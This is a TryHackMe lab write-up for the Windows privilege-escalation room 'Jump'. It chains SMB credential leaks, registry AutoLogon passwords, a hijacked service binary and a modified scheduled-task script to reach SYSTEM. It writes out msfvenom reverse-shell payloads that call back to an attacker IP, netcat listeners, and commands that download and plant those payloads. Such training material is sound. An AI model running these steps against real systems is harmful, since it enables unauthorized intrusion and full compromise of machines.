---
type: writeup
platform: TryHackMe
room: Jump
os: Windows
environment: Windows Privilege Escalation
last_verified: 2026-09-28

techniques:
  - smb-enumeration
  - credential-disclosure
  - registry-credential-discovery
  - service-binary-hijacking
  - scheduled-task-abuse
  - privilege-escalation

tools:
  - nmap
  - smbclient
  - netexec
  - xfreerdp
  - powershell
  - msfvenom
  - netcat
---
**Attack path:** Guest SMB access → exposed `thmuser` credentials → Winlogon AutoLogon credentials → `notadmin` → writable service executable → `svcadmin` → writable scheduled-task script → SYSTEM

## 1. Reconnaissance

Initial service enumeration:

```bash
nmap -sC -sV <TARGET_IP>

nmap -p- --min-rate 5000 -Pn <TARGET_IP>
```

Relevant services included:

```bash
445/tcp   SMB
3389/tcp  RDP
5985/tcp  WinRM
```

SMB was the first useful attack surface because it could expose shares and potentially accessible files without an authenticated Windows session.

---

## 2. Guest SMB Access → `thmuser`

Available SMB shares were listed without supplying a password:

```bash
smbclient -L //<TARGET_IP> -N
```

A readable share was discovered:

```bash
Public    Disk    Public file share
```

Access was tested directly:

```bash
smbclient //<TARGET_IP>/Public -N
```

The share contained `welcome.txt`:

```bash
smb: \> ls
smb: \> get welcome.txt
smb: \> exit

cat welcome.txt
```

The file disclosed credentials for a Windows user:

```bash
Username: thmuser
Password: <REDACTED>
```

Additional SMB enumeration with the Guest account was performed:

```bash
netexec smb <TARGET_IP> -u guest -p '' --rid-brute
```

Relevant accounts included:

```bash
thmuser
notadmin
svcadmin
```

The recovered `thmuser` credential was then used for RDP:

```bash
xfreerdp /dynamic-resolution +clipboard /cert:ignore \
  /v:<TARGET_IP> \
  /u:thmuser \
  /p:'<REDACTED>'
```

The resulting identity was verified:

```powershell
whoami
```

```bash
privesc\thmuser
```

The first room flag was available from the user's desktop:

```powershell
Get-Content C:\Users\thmuser\Desktop\flag1.txt
```

```bash
THM{REDACTED}
```

WinRM was also exposed on port `5985`, but `thmuser` was not authorized to establish a WinRM session.

This distinction matters:

```text
open WinRM port
≠
user authorized for WinRM
```

---

## 3. `thmuser` → `notadmin` — Winlogon AutoLogon Credentials

Basic local enumeration did not immediately reveal a privilege-escalation path:

```powershell
whoami /groups
whoami /priv
cmdkey /list
```

The Windows Winlogon registry configuration was then inspected:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
```

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

The registry exposed AutoLogon credentials:

```bash
DefaultUserName = notadmin
DefaultPassword = <REDACTED>
```

The issue was straightforward: a reusable plaintext credential was stored in the registry and readable from the current context.

The recovered account was used to start a new PowerShell process:

```powershell
runas /user:PRIVESC\notadmin powershell.exe
```

For a local account, the equivalent syntax was:

```powershell
runas /user:.\notadmin powershell.exe
```

After entering the recovered password, the new context was verified:

```powershell
whoami
```

```bash
privesc\notadmin
```

The second flag was then accessible:

```powershell
Get-Content C:\Users\notadmin\Desktop\flag2.txt
```

```bash
THM{REDACTED}
```

---

## 4. `notadmin` → `svcadmin` — Writable Service Executable

Services running under the `svcadmin` account were enumerated:

```powershell
Get-CimInstance Win32_Service |
Where-Object {$_.StartName -match "svcadmin"} |
Select-Object Name,StartName,PathName,State
```

Relevant result:

```bash
Name      : THMSvc
StartName : .\svcadmin
PathName  : C:\Windows\THMSVC\svc.exe
State     : Stopped
```

The service configuration confirmed both the executable path and execution identity:

```powershell
sc.exe qc THMSvc
```

```bash
BINARY_PATH_NAME   : C:\Windows\THMSVC\svc.exe
SERVICE_START_NAME : .\svcadmin
```

Permissions on the service directory and executable were then checked:

```powershell
icacls C:\Windows\THMSVC
icacls C:\Windows\THMSVC\svc.exe
```

Relevant permissions included:

```bash
C:\Windows\THMSVC
→ notadmin:(F)

svc.exe
→ Everyone:(F)
```

`(F)` represents Full Control.

The privilege-escalation condition was therefore:

```text
notadmin can replace svc.exe
+
THMSvc executes svc.exe as svcadmin
=
code execution as svcadmin
```

A service-compatible reverse-shell executable was generated:

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=<ATTACKER_IP> \
  LPORT=4444 \
  -f exe-service \
  -o svc.exe
```

Using `exe-service` is important because the binary is launched directly by the Windows Service Control Manager.

The payload was served from the attacker machine:

```bash
python3 -m http.server 8000
```

A listener was prepared:

```bash
nc -lvnp 4444
```

Before replacing the original service binary, it was backed up:

```powershell
Copy-Item C:\Windows\THMSVC\svc.exe C:\Windows\THMSVC\svc.exe.bak
```

The replacement executable was downloaded:

```powershell
Invoke-WebRequest `
  http://<ATTACKER_IP>:8000/svc.exe `
  -OutFile C:\Windows\THMSVC\svc.exe
```

The service was then started:

```powershell
sc.exe start THMSvc
```

The reverse shell connected back and the resulting context was verified:

```cmd
whoami
```

```bash
privesc\svcadmin
```

The third flag was accessible as:

```cmd
type C:\Users\svcadmin\Desktop\flag3.txt
```

```bash
THM{REDACTED}
```

### Useful Failure — Standard EXE vs Service EXE

A payload generated with:

```bash
-f exe
```

also produced a callback during testing, but the service manager returned:

```bash
Error 1053
The service did not respond to the start or control request in a timely fashion.
```

The callback proved that the executable ran, but it did **not** mean that it behaved as a correctly implemented Windows service.

For direct service-binary replacement, the appropriate format was therefore:

```bash
-f exe-service
```

---

## 5. `svcadmin` → SYSTEM — Writable Scheduled-Task Script

From the `svcadmin` shell, a batch file under `C:\Windows\Tasks` was inspected:

```cmd
type C:\Windows\Tasks\Cleanup.bat
```

Original contents:

```batch
@echo off
del /Q /F "%TEMP%\*.tmp" 2>nul
```

Its permissions were checked:

```cmd
icacls C:\Windows\Tasks\Cleanup.bat
```

Relevant result:

```bash
PRIVESC\svcadmin:(I)(M)
NT AUTHORITY\SYSTEM:(I)(F)
```

Here:

```bash
(M) = Modify
(I) = inherited permission
```

The important condition was that `svcadmin` could modify a script that was executed periodically by a more privileged scheduled task.

The escalation primitive was:

```text
privileged Scheduled Task
        ↓
executes Cleanup.bat
        +
svcadmin can modify Cleanup.bat
        ↓
attacker-controlled code executes
in the privileged task context
```

A normal Windows executable payload was sufficient here because it would be launched from the batch script rather than directly by the Service Control Manager:

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=<ATTACKER_IP> \
  LPORT=5555 \
  -f exe \
  -o shell.exe
```

A listener was started:

```bash
nc -lvnp 5555
```

The payload was downloaded to the target:

```cmd
powershell -c "Invoke-WebRequest -Uri 'http://<ATTACKER_IP>:8000/shell.exe' -OutFile 'C:\Windows\Tasks\shell.exe'"
```

Its presence was verified:

```cmd
dir C:\Windows\Tasks\shell.exe
```

The original batch file could be preserved before modification:

```cmd
copy C:\Windows\Tasks\Cleanup.bat C:\Windows\Tasks\Cleanup.bat.bak
```

The scheduled-task script was then replaced with a command launching the payload:

```cmd
echo C:\Windows\Tasks\shell.exe > C:\Windows\Tasks\Cleanup.bat
```

The modified content was verified:

```cmd
type C:\Windows\Tasks\Cleanup.bat
```

When the scheduled task next executed the batch file, the listener received a new shell.

The final identity was verified:

```cmd
whoami
```

```bash
nt authority\system
```

The final room flag was then accessible:

```cmd
type C:\flag4.txt
```

```bash
THM{REDACTED}
```

---

## Key Takeaways

- Readable SMB shares can expose credentials even when the initial access level appears limited to Guest.
- An open remote-management port does not imply that the current account is authorized to use that service.
- Windows AutoLogon configuration can expose reusable plaintext credentials through the Winlogon registry.
- A writable service executable becomes a privilege-escalation primitive when the service executes it under a more privileged account.
- A successful callback from a normal executable does not mean the payload correctly implements the Windows service interface; `exe-service` is the appropriate format for direct service replacement.
- Scheduled-task escalation depends on the same trust-boundary principle: if a privileged task executes a file writable by a lower-privileged user, that file becomes a path to the task's execution context.